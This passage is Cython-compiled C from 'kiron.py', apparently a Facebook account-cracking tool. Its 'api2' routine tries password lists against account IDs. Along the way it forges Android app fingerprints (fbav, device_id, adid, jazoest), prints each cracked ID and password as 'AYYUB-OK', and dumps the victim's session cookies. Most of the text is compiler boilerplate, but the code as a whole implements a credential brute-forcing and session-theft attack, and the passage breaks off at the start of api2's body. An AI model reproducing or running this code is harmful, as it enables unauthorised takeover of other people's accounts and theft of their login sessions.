  __Pyx_XDECREF(__pyx_t_10);
  __Pyx_XDECREF(__pyx_t_11);
  __Pyx_XDECREF(__pyx_t_12);
  __Pyx_XDECREF(__pyx_t_18);
  __Pyx_XDECREF(__pyx_t_19);
  __Pyx_XDECREF(__pyx_t_20);
  __Pyx_XDECREF(__pyx_t_21);
  __Pyx_AddTraceback("kiron.api1", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_fn);
  __Pyx_XDECREF(__pyx_v_ln);
  __Pyx_XDECREF(__pyx_v_pw);
  __Pyx_XDECREF(__pyx_v_pas);
  __Pyx_XDECREF(__pyx_v_accessToken);
  __Pyx_XDECREF(__pyx_v_fbav);
  __Pyx_XDECREF(__pyx_v_fbbv);
  __Pyx_XDECREF(__pyx_v_android_version);
  __Pyx_XDECREF(__pyx_v_model);
  __Pyx_XDECREF(__pyx_v_build);
  __Pyx_XDECREF(__pyx_v_fblc);
  __Pyx_XDECREF(__pyx_v_fbcr);
  __Pyx_XDECREF(__pyx_v_fbmf);
  __Pyx_XDECREF(__pyx_v_fbbd);
  __Pyx_XDECREF(__pyx_v_fbdv);
  __Pyx_XDECREF(__pyx_v_fbsv);
  __Pyx_XDECREF(__pyx_v_fbca);
  __Pyx_XDECREF(__pyx_v_fbdm);
  __Pyx_XDECREF(__pyx_v_fbfw);
  __Pyx_XDECREF(__pyx_v_fbrv);
  __Pyx_XDECREF(__pyx_v_fban);
  __Pyx_XDECREF(__pyx_v_fbpn);
  __Pyx_XDECREF(__pyx_v_ua);
  __Pyx_XDECREF(__pyx_v_random_seed);
  __Pyx_XDECREF(__pyx_v_adid);
  __Pyx_XDECREF(__pyx_v_device_id);
  __Pyx_XDECREF(__pyx_v_secure);
  __Pyx_XDECREF(__pyx_v_family);
  __Pyx_XDECREF(__pyx_v_xd);
  __Pyx_XDECREF(__pyx_v_sim_serials);
  __Pyx_XDECREF(__pyx_v_li);
  __Pyx_XDECREF(__pyx_v_li2);
  __Pyx_XDECREF(__pyx_v_j1);
  __Pyx_XDECREF(__pyx_v_jazoest);
  __Pyx_XDECREF(__pyx_v_data);
  __Pyx_XDECREF(__pyx_v_headers);
  __Pyx_XDECREF(__pyx_v_url);
  __Pyx_XDECREF(__pyx_v_po);
  __Pyx_XDECREF(__pyx_v_coki);
  __Pyx_XDECREF(__pyx_gb_5kiron_4api1_2generator1);
  __Pyx_XDECREF(__pyx_gb_5kiron_4api1_5generator2);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "kiron.py":571
 *                 time.sleep(10)
 * #__________________| FILE METHOD M2 |__________________#
 * def api2(ids,names,passlist):             # <<<<<<<<<<<<<<
 *         try:
 *                 global oks,loop,sim_id
 */

/* Python wrapper */
static PyObject *__pyx_pw_5kiron_31api2(PyObject *__pyx_self, 
#if CYTHON_METH_FASTCALL
PyObject *const *__pyx_args, Py_ssize_t __pyx_nargs, PyObject *__pyx_kwds
#else
PyObject *__pyx_args, PyObject *__pyx_kwds
#endif
); /*proto*/
static PyMethodDef __pyx_mdef_5kiron_31api2 = {"api2", (PyCFunction)(void*)(__Pyx_PyCFunction_FastCallWithKeywords)__pyx_pw_5kiron_31api2, __Pyx_METH_FASTCALL|METH_KEYWORDS, 0};
static PyObject *__pyx_pw_5kiron_31api2(PyObject *__pyx_self, 
#if CYTHON_METH_FASTCALL
PyObject *const *__pyx_args, Py_ssize_t __pyx_nargs, PyObject *__pyx_kwds
#else
PyObject *__pyx_args, PyObject *__pyx_kwds
#endif
) {
  PyObject *__pyx_v_ids = 0;
  PyObject *__pyx_v_names = 0;
  PyObject *__pyx_v_passlist = 0;
  #if !CYTHON_METH_FASTCALL
  CYTHON_UNUSED Py_ssize_t __pyx_nargs;
  #endif
  CYTHON_UNUSED PyObject *const *__pyx_kwvalues;
  PyObject* values[3] = {0,0,0};
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("api2 (wrapper)", 0);
  #if !CYTHON_METH_FASTCALL
  #if CYTHON_ASSUME_SAFE_MACROS
  __pyx_nargs = PyTuple_GET_SIZE(__pyx_args);
  #else
  __pyx_nargs = PyTuple_Size(__pyx_args); if (unlikely(__pyx_nargs < 0)) return NULL;
  #endif
  #endif
  __pyx_kwvalues = __Pyx_KwValues_FASTCALL(__pyx_args, __pyx_nargs);
  {
    PyObject **__pyx_pyargnames[] = {&__pyx_n_s_ids,&__pyx_n_s_names,&__pyx_n_s_passlist,0};
    if (__pyx_kwds) {
      Py_ssize_t kw_args;
      switch (__pyx_nargs) {
        case  3: values[2] = __Pyx_Arg_FASTCALL(__pyx_args, 2);
        CYTHON_FALLTHROUGH;
        case  2: values[1] = __Pyx_Arg_FASTCALL(__pyx_args, 1);
        CYTHON_FALLTHROUGH;
        case  1: values[0] = __Pyx_Arg_FASTCALL(__pyx_args, 0);
        CYTHON_FALLTHROUGH;
        case  0: break;
        default: goto __pyx_L5_argtuple_error;
      }
      kw_args = __Pyx_NumKwargs_FASTCALL(__pyx_kwds);
      switch (__pyx_nargs) {
        case  0:
        if (likely((values[0] = __Pyx_GetKwValue_FASTCALL(__pyx_kwds, __pyx_kwvalues, __pyx_n_s_ids)) != 0)) {
          (void)__Pyx_Arg_NewRef_FASTCALL(values[0]);
          kw_args--;
        }
        else if (unlikely(PyErr_Occurred())) __PYX_ERR(0, 571, __pyx_L3_error)
        else goto __pyx_L5_argtuple_error;
        CYTHON_FALLTHROUGH;
        case  1:
        if (likely((values[1] = __Pyx_GetKwValue_FASTCALL(__pyx_kwds, __pyx_kwvalues, __pyx_n_s_names)) != 0)) {
          (void)__Pyx_Arg_NewRef_FASTCALL(values[1]);
          kw_args--;
        }
        else if (unlikely(PyErr_Occurred())) __PYX_ERR(0, 571, __pyx_L3_error)
        else {
          __Pyx_RaiseArgtupleInvalid("api2", 1, 3, 3, 1); __PYX_ERR(0, 571, __pyx_L3_error)
        }
        CYTHON_FALLTHROUGH;
        case  2:
        if (likely((values[2] = __Pyx_GetKwValue_FASTCALL(__pyx_kwds, __pyx_kwvalues, __pyx_n_s_passlist)) != 0)) {
          (void)__Pyx_Arg_NewRef_FASTCALL(values[2]);
          kw_args--;
        }
        else if (unlikely(PyErr_Occurred())) __PYX_ERR(0, 571, __pyx_L3_error)
        else {
          __Pyx_RaiseArgtupleInvalid("api2", 1, 3, 3, 2); __PYX_ERR(0, 571, __pyx_L3_error)
        }
      }
      if (unlikely(kw_args > 0)) {
        const Py_ssize_t kwd_pos_args = __pyx_nargs;
        if (unlikely(__Pyx_ParseOptionalKeywords(__pyx_kwds, __pyx_kwvalues, __pyx_pyargnames, 0, values + 0, kwd_pos_args, "api2") < 0)) __PYX_ERR(0, 571, __pyx_L3_error)
      }
    } else if (unlikely(__pyx_nargs != 3)) {
      goto __pyx_L5_argtuple_error;
    } else {
      values[0] = __Pyx_Arg_FASTCALL(__pyx_args, 0);
      values[1] = __Pyx_Arg_FASTCALL(__pyx_args, 1);
      values[2] = __Pyx_Arg_FASTCALL(__pyx_args, 2);
    }
    __pyx_v_ids = values[0];
    __pyx_v_names = values[1];
    __pyx_v_passlist = values[2];
  }
  goto __pyx_L6_skip;
  __pyx_L5_argtuple_error:;
  __Pyx_RaiseArgtupleInvalid("api2", 1, 3, 3, __pyx_nargs); __PYX_ERR(0, 571, __pyx_L3_error)
  __pyx_L6_skip:;
  goto __pyx_L4_argument_unpacking_done;
  __pyx_L3_error:;
  {
    Py_ssize_t __pyx_temp;
    for (__pyx_temp=0; __pyx_temp < (Py_ssize_t)(sizeof(values)/sizeof(values[0])); ++__pyx_temp) {
      __Pyx_Arg_XDECREF_FASTCALL(values[__pyx_temp]);
    }
  }
  __Pyx_AddTraceback("kiron.api2", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __Pyx_RefNannyFinishContext();
  return NULL;
  __pyx_L4_argument_unpacking_done:;
  __pyx_r = __pyx_pf_5kiron_30api2(__pyx_self, __pyx_v_ids, __pyx_v_names, __pyx_v_passlist);

  /* function exit code */
  {
    Py_ssize_t __pyx_temp;
    for (__pyx_temp=0; __pyx_temp < (Py_ssize_t)(sizeof(values)/sizeof(values[0])); ++__pyx_temp) {
      __Pyx_Arg_XDECREF_FASTCALL(values[__pyx_temp]);
    }
  }
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}
static PyObject *__pyx_gb_5kiron_4api2_2generator3(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value); /* proto */

/* "kiron.py":611
 *                         li = ['28','29','210']
 *                         li2 = random.choice(li)
 *                         j1 = ''.join(random.choice(string.digits) for _ in range(2))             # <<<<<<<<<<<<<<
 *                         jazoest = li2+j1
 *                         data = {
 */

static PyObject *__pyx_pf_5kiron_4api2_genexpr(CYTHON_UNUSED PyObject *__pyx_self) {
  struct __pyx_obj_5kiron___pyx_scope_struct_3_genexpr *__pyx_cur_scope;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("genexpr", 0);
  __pyx_cur_scope = (struct __pyx_obj_5kiron___pyx_scope_struct_3_genexpr *)__pyx_tp_new_5kiron___pyx_scope_struct_3_genexpr(__pyx_ptype_5kiron___pyx_scope_struct_3_genexpr, __pyx_empty_tuple, NULL);
  if (unlikely(!__pyx_cur_scope)) {
    __pyx_cur_scope = ((struct __pyx_obj_5kiron___pyx_scope_struct_3_genexpr *)Py_None);
    __Pyx_INCREF(Py_None);
    __PYX_ERR(0, 611, __pyx_L1_error)
  } else {
    __Pyx_GOTREF((PyObject *)__pyx_cur_scope);
  }
  {
    __pyx_CoroutineObject *gen = __Pyx_Generator_New((__pyx_coroutine_body_t) __pyx_gb_5kiron_4api2_2generator3, NULL, (PyObject *) __pyx_cur_scope, __pyx_n_s_genexpr, __pyx_n_s_api2_locals_genexpr, __pyx_n_s_kiron); if (unlikely(!gen)) __PYX_ERR(0, 611, __pyx_L1_error)
    __Pyx_DECREF(__pyx_cur_scope);
    __Pyx_RefNannyFinishContext();
    return (PyObject *) gen;
  }

  /* function exit code */
  __pyx_L1_error:;
  __Pyx_AddTraceback("kiron.api2.genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __Pyx_DECREF((PyObject *)__pyx_cur_scope);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_gb_5kiron_4api2_2generator3(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value) /* generator body */
{
  struct __pyx_obj_5kiron___pyx_scope_struct_3_genexpr *__pyx_cur_scope = ((struct __pyx_obj_5kiron___pyx_scope_struct_3_genexpr *)__pyx_generator->closure);
  PyObject *__pyx_r = NULL;
  long __pyx_t_1;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  int __pyx_t_6;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("genexpr", 0);
  switch (__pyx_generator->resume_label) {
    case 0: goto __pyx_L3_first_run;
    case 1: goto __pyx_L6_resume_from_yield;
    default: /* CPython raises the right error here */
    __Pyx_RefNannyFinishContext();
    return NULL;
  }
  __pyx_L3_first_run:;
  if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 611, __pyx_L1_error)
  for (__pyx_t_1 = 0; __pyx_t_1 < 2; __pyx_t_1+=1) {
    __pyx_cur_scope->__pyx_v__ = __pyx_t_1;
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_random); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 611, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_choice); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 611, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_string); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 611, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_digits); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 611, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_3 = NULL;
    __pyx_t_6 = 0;
    #if CYTHON_UNPACK_METHODS
    if (unlikely(PyMethod_Check(__pyx_t_4))) {
      __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_4);
      if (likely(__pyx_t_3)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
        __Pyx_INCREF(__pyx_t_3);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_4, function);
        __pyx_t_6 = 1;
      }
    }
    #endif
    {
      PyObject *__pyx_callargs[2] = {__pyx_t_3, __pyx_t_5};
      __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_6, 1+__pyx_t_6);
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 611, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    }
    __pyx_r = __pyx_t_2;
    __pyx_t_2 = 0;
    __pyx_cur_scope->__pyx_t_0 = __pyx_t_1;
    __Pyx_XGIVEREF(__pyx_r);
    __Pyx_RefNannyFinishContext();
    __Pyx_Coroutine_ResetAndClearException(__pyx_generator);
    /* return from generator, yielding value */
    __pyx_generator->resume_label = 1;
    return __pyx_r;
    __pyx_L6_resume_from_yield:;
    __pyx_t_1 = __pyx_cur_scope->__pyx_t_0;
    if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 611, __pyx_L1_error)
  }
  CYTHON_MAYBE_UNUSED_VAR(__pyx_cur_scope);

  /* function exit code */
  PyErr_SetNone(PyExc_StopIteration);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_Generator_Replace_StopIteration(0);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_AddTraceback("genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_r); __pyx_r = 0;
  #if !CYTHON_USE_EXC_INFO_STACK
  __Pyx_Coroutine_ResetAndClearException(__pyx_generator);
  #endif
  __pyx_generator->resume_label = -1;
  __Pyx_Coroutine_clear((PyObject*)__pyx_generator);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}
static PyObject *__pyx_gb_5kiron_4api2_5generator4(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value); /* proto */

/* "kiron.py":656
 *                         if 'session_key' in po:
 *                                         print(f'\r\r\x1b[38;5;244m[\x1b[38;5;46mAYYUB-OK\x1b[38;5;244m]\x1b[38;5;46m '+ids+f' ~\x1b[38;5;244m\x1b[38;5;46m '+pas+'\033[1;97m')
 *                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])             # <<<<<<<<<<<<<<
 *                                         print(f"\r\r\x1b[38;5;244m (\x1b[38;5;46m\x1b[38;5;244m)>>{A} "+coki)
 *                                         linex()
 */

static PyObject *__pyx_pf_5kiron_4api2_3genexpr(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_genexpr_arg_0) {
  struct __pyx_obj_5kiron___pyx_scope_struct_4_genexpr *__pyx_cur_scope;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("genexpr", 0);
  __pyx_cur_scope = (struct __pyx_obj_5kiron___pyx_scope_struct_4_genexpr *)__pyx_tp_new_5kiron___pyx_scope_struct_4_genexpr(__pyx_ptype_5kiron___pyx_scope_struct_4_genexpr, __pyx_empty_tuple, NULL);
  if (unlikely(!__pyx_cur_scope)) {
    __pyx_cur_scope = ((struct __pyx_obj_5kiron___pyx_scope_struct_4_genexpr *)Py_None);
    __Pyx_INCREF(Py_None);
    __PYX_ERR(0, 656, __pyx_L1_error)
  } else {
    __Pyx_GOTREF((PyObject *)__pyx_cur_scope);
  }
  __pyx_cur_scope->__pyx_genexpr_arg_0 = __pyx_genexpr_arg_0;
  __Pyx_INCREF(__pyx_cur_scope->__pyx_genexpr_arg_0);
  __Pyx_GIVEREF(__pyx_cur_scope->__pyx_genexpr_arg_0);
  {
    __pyx_CoroutineObject *gen = __Pyx_Generator_New((__pyx_coroutine_body_t) __pyx_gb_5kiron_4api2_5generator4, NULL, (PyObject *) __pyx_cur_scope, __pyx_n_s_genexpr, __pyx_n_s_api2_locals_genexpr, __pyx_n_s_kiron); if (unlikely(!gen)) __PYX_ERR(0, 656, __pyx_L1_error)
    __Pyx_DECREF(__pyx_cur_scope);
    __Pyx_RefNannyFinishContext();
    return (PyObject *) gen;
  }

  /* function exit code */
  __pyx_L1_error:;
  __Pyx_AddTraceback("kiron.api2.genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __Pyx_DECREF((PyObject *)__pyx_cur_scope);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_gb_5kiron_4api2_5generator4(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value) /* generator body */
{
  struct __pyx_obj_5kiron___pyx_scope_struct_4_genexpr *__pyx_cur_scope = ((struct __pyx_obj_5kiron___pyx_scope_struct_4_genexpr *)__pyx_generator->closure);
  PyObject *__pyx_r = NULL;
  PyObject *__pyx_t_1 = NULL;
  Py_ssize_t __pyx_t_2;
  PyObject *(*__pyx_t_3)(PyObject *);
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("genexpr", 0);
  switch (__pyx_generator->resume_label) {
    case 0: goto __pyx_L3_first_run;
    case 1: goto __pyx_L6_resume_from_yield;
    default: /* CPython raises the right error here */
    __Pyx_RefNannyFinishContext();
    return NULL;
  }
  __pyx_L3_first_run:;
  if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 656, __pyx_L1_error)
  if (unlikely(!__pyx_cur_scope->__pyx_genexpr_arg_0)) { __Pyx_RaiseUnboundLocalError(".0"); __PYX_ERR(0, 656, __pyx_L1_error) }
  if (likely(PyList_CheckExact(__pyx_cur_scope->__pyx_genexpr_arg_0)) || PyTuple_CheckExact(__pyx_cur_scope->__pyx_genexpr_arg_0)) {
    __pyx_t_1 = __pyx_cur_scope->__pyx_genexpr_arg_0; __Pyx_INCREF(__pyx_t_1);
    __pyx_t_2 = 0;
    __pyx_t_3 = NULL;
  } else {
    __pyx_t_2 = -1; __pyx_t_1 = PyObject_GetIter(__pyx_cur_scope->__pyx_genexpr_arg_0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 656, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_3 = __Pyx_PyObject_GetIterNextFunc(__pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 656, __pyx_L1_error)
  }
  for (;;) {
    if (likely(!__pyx_t_3)) {
      if (likely(PyList_CheckExact(__pyx_t_1))) {
        {
          Py_ssize_t __pyx_temp = __Pyx_PyList_GET_SIZE(__pyx_t_1);
          #if !CYTHON_ASSUME_SAFE_MACROS
          if (unlikely((__pyx_temp < 0))) __PYX_ERR(0, 656, __pyx_L1_error)
          #endif
          if (__pyx_t_2 >= __pyx_temp) break;
        }
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_4 = PyList_GET_ITEM(__pyx_t_1, __pyx_t_2); __Pyx_INCREF(__pyx_t_4); __pyx_t_2++; if (unlikely((0 < 0))) __PYX_ERR(0, 656, __pyx_L1_error)
        #else
        __pyx_t_4 = __Pyx_PySequence_ITEM(__pyx_t_1, __pyx_t_2); __pyx_t_2++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 656, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_4);
        #endif
      } else {
        {
          Py_ssize_t __pyx_temp = __Pyx_PyTuple_GET_SIZE(__pyx_t_1);
          #if !CYTHON_ASSUME_SAFE_MACROS
          if (unlikely((__pyx_temp < 0))) __PYX_ERR(0, 656, __pyx_L1_error)
          #endif
          if (__pyx_t_2 >= __pyx_temp) break;
        }
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_4 = PyTuple_GET_ITEM(__pyx_t_1, __pyx_t_2); __Pyx_INCREF(__pyx_t_4); __pyx_t_2++; if (unlikely((0 < 0))) __PYX_ERR(0, 656, __pyx_L1_error)
        #else
        __pyx_t_4 = __Pyx_PySequence_ITEM(__pyx_t_1, __pyx_t_2); __pyx_t_2++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 656, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_4);
        #endif
      }
    } else {
      __pyx_t_4 = __pyx_t_3(__pyx_t_1);
      if (unlikely(!__pyx_t_4)) {
        PyObject* exc_type = PyErr_Occurred();
        if (exc_type) {
          if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
          else __PYX_ERR(0, 656, __pyx_L1_error)
        }
        break;
      }
      __Pyx_GOTREF(__pyx_t_4);
    }
    __Pyx_XGOTREF(__pyx_cur_scope->__pyx_v_i);
    __Pyx_XDECREF_SET(__pyx_cur_scope->__pyx_v_i, __pyx_t_4);
    __Pyx_GIVEREF(__pyx_t_4);
    __pyx_t_4 = 0;
    __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_cur_scope->__pyx_v_i, __pyx_n_s_name); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 656, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __pyx_t_5 = PyNumber_Add(__pyx_t_4, __pyx_kp_s__72); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 656, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_cur_scope->__pyx_v_i, __pyx_n_s_value); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 656, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __pyx_t_6 = PyNumber_Add(__pyx_t_5, __pyx_t_4); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 656, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_r = __pyx_t_6;
    __pyx_t_6 = 0;
    __Pyx_XGIVEREF(__pyx_t_1);
    __pyx_cur_scope->__pyx_t_0 = __pyx_t_1;
    __pyx_cur_scope->__pyx_t_1 = __pyx_t_2;
    __pyx_cur_scope->__pyx_t_2 = __pyx_t_3;
    __Pyx_XGIVEREF(__pyx_r);
    __Pyx_RefNannyFinishContext();
    __Pyx_Coroutine_ResetAndClearException(__pyx_generator);
    /* return from generator, yielding value */
    __pyx_generator->resume_label = 1;
    return __pyx_r;
    __pyx_L6_resume_from_yield:;
    __pyx_t_1 = __pyx_cur_scope->__pyx_t_0;
    __pyx_cur_scope->__pyx_t_0 = 0;
    __Pyx_XGOTREF(__pyx_t_1);
    __pyx_t_2 = __pyx_cur_scope->__pyx_t_1;
    __pyx_t_3 = __pyx_cur_scope->__pyx_t_2;
    if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 656, __pyx_L1_error)
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  CYTHON_MAYBE_UNUSED_VAR(__pyx_cur_scope);

  /* function exit code */
  PyErr_SetNone(PyExc_StopIteration);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_Generator_Replace_StopIteration(0);
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_AddTraceback("genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_r); __pyx_r = 0;
  #if !CYTHON_USE_EXC_INFO_STACK
  __Pyx_Coroutine_ResetAndClearException(__pyx_generator);
  #endif
  __pyx_generator->resume_label = -1;
  __Pyx_Coroutine_clear((PyObject*)__pyx_generator);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "kiron.py":571
 *                 time.sleep(10)
 * #__________________| FILE METHOD M2 |__________________#
 * def api2(ids,names,passlist):             # <<<<<<<<<<<<<<
 *         try:
 *                 global oks,loop,sim_id
 */

static PyObject *__pyx_pf_5kiron_30api2(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_ids, PyObject *__pyx_v_names, PyObject *__pyx_v_passlist) {
  PyObject *__pyx_v_fn = NULL;
  PyObject *__pyx_v_ln = NULL;
  PyObject *__pyx_v_pw = NULL;
  PyObject *__pyx_v_pas = NULL;
  PyObject *__pyx_v_accessToken = NULL;
  PyObject *__pyx_v_fbav = NULL;
  PyObject *__pyx_v_fbbv = NULL;
  PyObject *__pyx_v_android_version = NULL;
  PyObject *__pyx_v_model = NULL;
  PyObject *__pyx_v_build = NULL;
  PyObject *__pyx_v_fblc = NULL;
  PyObject *__pyx_v_fbcr = NULL;
  PyObject *__pyx_v_fbmf = NULL;
  PyObject *__pyx_v_fbbd = NULL;
  PyObject *__pyx_v_fbdv = NULL;
  PyObject *__pyx_v_fbsv = NULL;
  PyObject *__pyx_v_fbca = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_fbdm = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_fbfw = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_fbrv = NULL;
  PyObject *__pyx_v_fban = NULL;
  PyObject *__pyx_v_fbpn = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_ua = NULL;
  PyObject *__pyx_v_random_seed = NULL;
  PyObject *__pyx_v_adid = NULL;
  PyObject *__pyx_v_device_id = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_secure = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_family = NULL;
  PyObject *__pyx_v_xd = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_sim_serials = NULL;
  PyObject *__pyx_v_li = NULL;
  PyObject *__pyx_v_li2 = NULL;
  PyObject *__pyx_v_j1 = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_jazoest = NULL;
  PyObject *__pyx_v_data = NULL;
  PyObject *__pyx_v_headers = NULL;
  PyObject *__pyx_v_url = NULL;
  PyObject *__pyx_v_po = NULL;
  PyObject *__pyx_v_coki = NULL;
  PyObject *__pyx_gb_5kiron_4api2_2generator3 = 0;
  PyObject *__pyx_gb_5kiron_4api2_5generator4 = 0;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  Py_ssize_t __pyx_t_7;
  Py_UCS4 __pyx_t_8;
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  PyObject *__pyx_t_11 = NULL;
  PyObject *__pyx_t_12 = NULL;
  int __pyx_t_13;
  PyObject *__pyx_t_14 = NULL;
  PyObject *__pyx_t_15 = NULL;
  PyObject *__pyx_t_16 = NULL;
  PyObject *(*__pyx_t_17)(PyObject *);
  PyObject *__pyx_t_18 = NULL;
  PyObject *__pyx_t_19 = NULL;
  PyObject *__pyx_t_20 = NULL;
  PyObject *__pyx_t_21 = NULL;
  Py_ssize_t __pyx_t_22;
  int __pyx_t_23;
  int __pyx_t_24;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("api2", 1);

  /* "kiron.py":572
 * #__________________| FILE METHOD M2 |__________________#
 * def api2(ids,names,passlist):
 *         try:             # <<<<<<<<<<<<<<
 *                 global oks,loop,sim_id
